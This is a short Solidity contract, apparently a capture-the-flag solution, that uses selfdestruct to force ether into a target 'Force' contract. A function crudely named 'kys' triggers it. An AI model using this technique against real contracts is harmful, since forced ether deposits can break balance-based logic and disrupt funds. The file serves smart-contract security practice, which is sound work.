// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Force.sol";

contract ForceAttack {
    address payable public victim;

    constructor(address _force) public {
        victim = payable(_force);
    }

    function kys() public payable {
        selfdestruct(victim);
    }

    receive() external payable {}
}
